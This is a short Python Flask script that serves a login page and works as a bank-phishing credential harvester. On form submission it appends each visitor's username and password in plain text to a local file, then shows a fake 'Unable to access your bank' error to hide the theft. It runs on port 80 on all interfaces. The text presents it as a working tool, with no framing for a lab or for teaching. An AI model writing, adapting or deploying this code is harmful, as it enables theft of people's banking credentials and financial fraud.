from flask import Flask, render_template, request
import os

app = Flask(__name__)

data_folder = "info"
credentials_file = 'credentials.txt'

@app.route('/', methods=('GET', 'POST'))
def portal():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if not os.path.exists(data_folder):
            os.mkdir(data_folder)
        with open(os.path.join(data_folder, credentials_file), mode='a') as f:
            f.write(f'username:{username}  password: {password}\n')
        return 'Unable to access your bank. please try again later'
    return render_template('login.html')


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=80)
